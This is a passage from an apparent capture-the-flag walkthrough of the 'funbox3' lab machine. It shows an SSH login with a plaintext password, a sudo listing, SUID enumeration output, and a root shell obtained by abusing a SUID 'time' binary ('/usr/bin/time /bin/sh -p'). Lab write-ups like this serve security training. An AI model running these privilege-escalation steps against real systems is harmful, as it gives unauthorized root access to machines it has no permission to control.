# 3 :22 ssh tony > root

```
$ ssh tony@192.168.129.111
yxcvbnmYYY
tony@funbox3:~$ whoami;id;hostname
tony
uid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
funbox3

tony@funbox3:~$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

## SuidEnum

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/bin/time
------------------------------
[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/bin/time -~> https://gtfobins.github.io/gtfobins/time/#suid
------------------------------
[$] Please try the command(s) below to exploit harmless SUID bin(s) found !!!
------------------------------
[~] /usr/bin/time /bin/sh -p
------------------------------

tony@funbox3:~$ /usr/bin/time /bin/sh -p
# whoami;id;hostname
root
uid=1000(tony) gid=1000(tony) euid=0(root) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
funbox3
```
